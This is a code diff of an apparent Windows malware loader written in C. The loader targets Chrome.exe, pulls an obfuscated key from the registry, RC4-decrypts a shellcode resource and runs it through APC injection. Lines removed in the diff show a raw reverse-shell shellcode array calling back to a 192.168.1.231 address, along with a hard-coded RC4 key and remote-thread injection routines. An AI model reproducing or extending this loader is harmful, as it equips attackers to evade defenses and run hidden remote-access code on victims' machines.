@@ -1,35 +1,74 @@
-#include "main.h"
+﻿#include "main.h"
 typedef void(WINAPI* pdllMainFunction)();
 int main()
 {
-	HANDLE hProcess = - 1, hProcess1, hProcess2, hThread, hThread1;
-	DWORD  dwPID0 = 0, dwPID1, dwPID2 = 0, dwOldProtections, dwThreadId;
-	PUCHAR pObfInput, * pObfOutput, pKey, pExtPayloadAddres;;
-	SIZE_T sBytesWritten, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
+	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0;
+	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId;
+	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
+	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
 	Context RC4Context_t;
 	RESOURCE resource;
 	PVOID pExPayload, pMain;
+	LPWSTR TargetProcessName = L"Chrome.exe";
 
-	if (!EnumProcNTQuerySystemInformation(L"Notepad.exe", &dwPID0, &hProcess))printf("[!] Enumerate Processes Nt Query System Information Failed to Find svchost\n");
+	if (!EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess)) 
+	{
+		wprintf(L"[!] Enumerate Processes Nt Query System Information Failed to Find %s\n", TargetProcessName);
+		return -1;
+	}
+	wprintf(L"[i] Found %s Process with id %d\n", TargetProcessName, dwPID0);
+	//if(!FetchRemoteThreadHandle(dwPID0, &dwThreadId, &hThread)) wprintf(L"[!] Failed to fetch a remote thread handle and id wis Error Code: %lx\n", GetLastError());
+	
+	if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
+	//printf("[i] Found a Thread! Thread Id: %lu\n[!] Starting A Test Run...\n", dwThreadId);
 
-	if(!ReadRegKeys(
-		&pObfOutput, 
-		&sObfuscatedSize
-	)) return -1;
+	
 
-	if (!(pKey = LocalAlloc(
-		LPTR,
-		256
-	))) return -2;
+	if(!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
+
+	if (!(pKey = LocalAlloc(LPTR,256))) return -2;
 
 	if (!DeobfuscatePayloadIPv6(
 		(PUCHAR*)&pKey, 
 		pObfOutput, 
-		sObfuscatedSize + 1, &sClearPayload, 
+		sObfuscatedSize + 1,
+		&sClearPayload, 
 		(unsigned char)(sPaddedInputSize - sOriginalInputSize)
 	)) return -3;
 
-	
+	strcat_s((char*)pKey, 256, "\n");
+
+	if (!FetchResource(&resource)) return -5;
+
+	PAYLOAD pPayload_t = {
+		.pText = LocalAlloc(LPTR, resource.sSize),
+		.sText = resource.sSize
+	};
+
+	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
+
+	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, resource.sSize);
+
+	Sleep(200);
+
+	if (!APCPayloadInjection(hThread, pPayload_t.pText, pPayload_t.sText)) return -6;
+
+	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");
+
+	//printf("Injecting Shellcode At Address: 0x%p\n", pExPayload);
+
+	//HijackThread(hThread, pExPayload);
+
+	CloseHandle(hThread);
+	CloseHandle(hProcess);
+	wprintf(L"[!] Finished!\n");
+	char pPath[MAX_PATH] = { '\0' };
+
+	//printf("[#] Payload Created Successfully! :)\n");
+	printf("[#] Press 'Enter' To Exit! :)");
+	Sleep(200 * 10);
+	return 0;
+}
 	/*
 	if (!FetchLocalThreadHandle(
 		GetCurrentThreadId(),
@@ -37,36 +76,17 @@ int main()
 		&hThread1)
 		)return -4;
 	*/
-	strcat_s((char*)pKey, 256, "\n");
+	//CreateSacrificialThread(&dwThreadId, &hThread1);
 
-	if (!FetchResource(
-		&resource
-	)) return -5;
-	PAYLOAD
-		pPayload_t = {
-			.pText = LocalAlloc(LPTR, resource.sSize),
-			.sText = resource.sSize
-	};
+	//HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);
 
-	if (!rInit(
-		&RC4Context_t, 
-		pKey, 
-		strlen((CHAR*)pKey)
-	)) return -6;
-
-	rFin(&RC4Context_t, resource.pAddress, pPayload_t.pText, resource.sSize);
-
-	CreateSacrificialThread(&dwThreadId, &hThread1);
-
-	HijackLocalThread(hThread1, pPayload_t.pText, pPayload_t.sText);
-
-	if (!CreateSuspendedProcess(
+	/*if (!CreateSuspendedProcess(
 		"Notepad.exe",
 		&dwPID0,
 		&hProcess,
 		&hThread
 	)) return -7;
-
+	
 	if (!InjectRemoteProcessShellcode(
 		hProcess, 
 		pPayload_t.pText, 
@@ -78,8 +98,7 @@ int main()
 		hThread1, 
 		pExtPayloadAddres
 	))return -9;
-
-
+	*/
 	/*
 
 	HijackLocalThread(hThread, pPayload_t.pText, pPayload_t.sText);
@@ -96,9 +115,6 @@ int main()
 
 	RtlSecureZeroMemory(pPayload_t.pText, resource.sSize + 1);
 
-
-
-
 	if (!VirtualProtectEx(hProcess, pExPayload, pPayload_t.sText, PAGE_EXECUTE, &dwOldProtections)) return -5;
 
 	if (!(hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pExPayload, NULL, 0, 0))) return -6;
@@ -106,44 +122,17 @@ int main()
 	
 	//RtlSecureZeroMemory(pKey, strlen((char *)pKey));
 
-
 	//if (!(dwPID0 = GetCurrentProcessId())) return -3;
 
 	//if ((hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID0)) == INVALID_HANDLE_VALUE) return -2;
 
 	//if (!EnumRemoteProcessHandle(L"Notepad.exe", &dwPID0, &hProcess)) printf("[!] Enumerate Remote Processes Handles Failed To Find Chrome\n");
 
-
 	//hProcess2 = FetchProcess(L"Notepad.exe", &pid2);
 
 	//if (!(hThread= CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&FetchDrives,  NULL, CREATE_SUSPENDED, &dwThreadId))) return FALSE;
 
-
-	/*
-	
-	unsigned char buf[] = { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x51, 0x56, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x4d, 0x31, 0xc9, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x44, 0x8b, 0x40, 0x20, 0x50, 0x49, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x4d, 0x31, 0xc9, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xbe, 0x77, 0x73, 0x32, 0x5f, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x48, 0x81, 0xec, 0xa0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xe5, 0x49, 0xbc, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8, 0x01, 0xe7, 0x41, 0x54, 0x49, 0x89, 0xe4, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x4c, 0x89, 0xea, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41, 0xba, 0x29, 0x80, 0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x41, 0x5e, 0x50, 0x50, 0x4d, 0x31, 0xc9, 0x4d, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc2, 0x48, 0xff, 0xc0, 0x48, 0x89, 0xc1, 0x41, 0xba, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x48, 0x89, 0xc7, 0x6a, 0x10, 0x41, 0x58, 0x4c, 0x89, 0xe2, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0x49, 0xff, 0xce, 0x75, 0xe5, 0xe8, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x10, 0x48, 0x89, 0xe2, 0x4d, 0x31, 0xc9, 0x6a, 0x04, 0x41, 0x58, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x55, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0x89, 0xf6, 0x6a, 0x40, 0x41, 0x59, 0x68, 0x00, 0x10, 0x00, 0x00, 0x41, 0x58, 0x48, 0x89, 0xf2, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x89, 0xc3, 0x49, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x49, 0x89, 0xf0, 0x48, 0x89, 0xda, 0x48, 0x89, 0xf9, 0x41, 0xba, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7d, 0x28, 0x58, 0x41, 0x57, 0x59, 0x68, 0x00, 0x40, 0x00, 0x00, 0x41, 0x58, 0x6a, 0x00, 0x5a, 0x41, 0xba, 0x0b, 0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x59, 0x41, 0xba, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x49, 0xff, 0xce, 0xe9, 0x3c, 0xff, 0xff, 0xff, 0x48, 0x01, 0xc3, 0x48, 0x29, 0xc6, 0x48, 0x85, 0xf6, 0x75, 0xb4, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5 };
-
-	Context rcContext;
-	
-	size_t sBuff = 511;
-
-	RESOURCE Resoursce_t;
-
-
-	
-	if (!FetchResource(&Resoursce_t)) return -1;
-
-	unsigned char* pCipher = malloc(Resoursce_t.sSize + 1);
-
-unsigned char key[256] = { '\0' };
-	memcpy(key, "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb", 256);
-
-	rInit(&rcContext, key, strlen((char *)key));
-	rFin(&rcContext, buf, pCipher, sBuff);
-	PrintHexData("Cipher Text Data:",pCipher, sBuff);
-	*/
 	//CheckVM();
-	
 
  	//if (system("pause"))printf("f\n");
 
@@ -151,24 +140,14 @@ unsigned char key[256] = { '\0' };
 
 	//memcpy(ProcessName,(L"Notepad.exe"), sizeof(WCHAR) * wcslen(L"Notepad.exe\0"));
 
-
 	//printf("[i] Reached End Of Searching.\n");
 	
-	 //*Initiate Payload Obfuscation
+	//*Initiate Payload Obfuscation
 
-
-	
 	//if (!(pObfInput = LocalAlloc(LPTR, 129))) return -1;
 
 	//memset(pObfInput, '\0', 129);
 
-	//CHAR testcase[65] = "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\0";
-
-
-	//printf("[!] Key: c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\n[!] Key Length: %zu\n", strlen("c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\0"));
-
-	//memcpy(pObfInput, "c12811e13ed75afe3e0945ef34e8a25b9d321a46e131c6463731de25a21b39eb\n", 128);
-	
 	// strlen((char *)pObfInput),
 	
 	//size_t sPaddedInputSize = 64, ;
@@ -177,9 +156,8 @@ unsigned char key[256] = { '\0' };
 	/*
 	 * MACFuscation
 	 *
-
 	size_t sOriginalInputSize = strlen((char *)pObfInput), sPaddedInputSize = 0, sObfuscatedSize = 0, sClearPayload = 0;
-
+	
 	printf("[i] MAC Input: %s\n[i] IPv6 Input's Length: %zu\n", (char *)pObfInput, sOriginalInputSize);
 
 	for (int i = 0; i < 48; i++) printf("--");
@@ -251,14 +229,6 @@ unsigned char key[256] = { '\0' };
 
 
 	//CloseHandle(hProcess);
-
-getchar();
-	char pPath[MAX_PATH] = { '\0' };
-
-	printf("[#] Payload Created Successfully! :)\n");
-	printf("[#] Press 'Enter' To Exit! :)");
-	return 0;
-}
 
 /*
 
